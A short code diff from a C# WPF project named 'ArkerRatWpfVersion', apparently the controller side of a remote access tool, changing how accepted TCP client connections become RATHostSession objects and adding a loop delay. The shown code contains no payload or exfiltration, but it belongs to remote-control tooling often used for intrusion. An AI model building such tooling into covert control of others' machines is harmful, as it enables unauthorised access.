@@ -16,6 +16,7 @@ using System.Diagnostics;
 using System.Windows.Threading;
 using ArkerRatWpfVersion;
 using ArkerRatWpfVersion;
+using System.Windows.Forms;
 
 namespace ArkerRatWpfVersion
 {
@@ -50,12 +51,10 @@ namespace ArkerRatWpfVersion
                                 {
                                     tag++;
                                     TcpClient client = await listener.AcceptTcpClientAsync();
-                                    App.Current.Dispatcher.Invoke(() =>
-                                    {
-                                        RATHostSession session = new RATHostSession(client, Convert.ToString(tag), port);
-                                        rATClients.Add(session);
-                                    });
+                                    RATHostSession session = new RATHostSession(client, Convert.ToString(tag), port);
+                                    rATClients.Add(session);
                                 }
+                                await Task.Delay(100);
                             }
                         });
                     }
